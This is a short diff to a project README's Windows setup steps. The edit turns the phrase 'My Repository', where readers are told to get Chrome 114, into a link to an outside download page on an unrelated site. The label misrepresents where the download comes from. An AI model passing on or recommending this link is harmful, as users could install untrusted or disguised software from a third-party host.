@@ -44,7 +44,7 @@ Press Ctrl+C
 
 
 ### How to Run in Windows :
-First You Need To Change Chrome Version in Your PC ( Chrome 114 Version ) Just Download Chrome_114 in My Repository
+First You Need To Change Chrome Version in Your PC ( Chrome 114 Version ) Just Download Chrome_114 in [My Repository](https://bestim.org/download/13214/?tmstv=1687251688)
 And Then Turn OFF Auto Update in Chrome
 
 1. Install Python
